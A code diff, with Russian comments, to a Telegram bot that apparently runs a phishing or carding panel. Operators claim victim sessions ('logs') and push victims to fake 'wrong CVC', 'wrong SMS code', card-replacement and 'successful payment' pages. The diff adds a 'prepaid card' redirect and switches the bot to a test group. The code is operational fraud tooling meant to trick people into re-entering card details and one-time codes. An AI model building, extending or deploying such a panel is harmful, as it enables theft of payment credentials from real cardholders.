@@ -37,7 +37,7 @@ async def take_log(callback: types.CallbackQuery):
         f"взял @{username}(ID: {callback.from_user.id})"
     )
     
-    await callback.bot.send_message(config.GROUP_ID, group_message)
+    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)
 
     async with httpx.AsyncClient() as client:
         customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
@@ -128,7 +128,7 @@ async def take_from_user(callback: types.CallbackQuery):
         f"перешел к @{new_username}(ID: {callback.from_user.id})"
     )
     
-    await callback.bot.send_message(config.GROUP_ID, group_message)
+    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)
     
     # Забираем лог себе
     update_log_taken_by(session_id, callback.from_user.id)
@@ -205,7 +205,7 @@ async def take_from_user(callback: types.CallbackQuery):
         print(f"Не удалось уведомить пользователя {previous_owner_id}: бот заблокирован или диалог не начат")
         # Можно отправить уведомление в группу
         await callback.bot.send_message(
-            config.GROUP_ID,
+            config.GROUP_ID_TEST,
             f"⚠️ Не удалось уведомить пользователя ID {previous_owner_id} о перехвате лога"
         )
     except Exception as e:
@@ -271,7 +271,8 @@ async def handle_redirect_action(callback: types.CallbackQuery):
         "change": "/redirect-change",
         "success": "/redirect-success",
         "wrong_cvc": "/redirect-wrong-cvc",
-        "wrong_sms": "/redirect-wrong-sms"
+        "wrong_sms": "/redirect-wrong-sms",
+        "prepaid": "/redirect-prepaid"
     }
     
     try:
@@ -291,7 +292,8 @@ async def handle_redirect_action(callback: types.CallbackQuery):
                     "change": "✅ Пользователь перенаправлен на страницу замены карты", 
                     "success": "✅ Успешная оплата!",
                     "wrong_cvc": "✅ Пользователь перенаправлен на страницу ввода карты заново (неверный CVC)",
-                    "wrong_sms": "✅ Пользователь перенаправлен на страницу повторого ввода кода (неверный SMS код)"
+                    "wrong_sms": "✅ Пользователь перенаправлен на страницу повторого ввода кода (неверный SMS код)",
+                    "prepaid": "✅ Пользователь перенаправлен на страницу ввода карты заново (Prepaid card)"
                 }
                 
                 # Отправляем подтверждение с кнопками управления
@@ -320,3 +322,4 @@ def register_callbacks(dp: Dispatcher):
     dp.callback_query.register(handle_redirect_action, F.data.startswith("success:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:")) 
     dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_sms:"))
+    dp.callback_query.register(handle_redirect_action, F.data.startswith("prepaid:"))
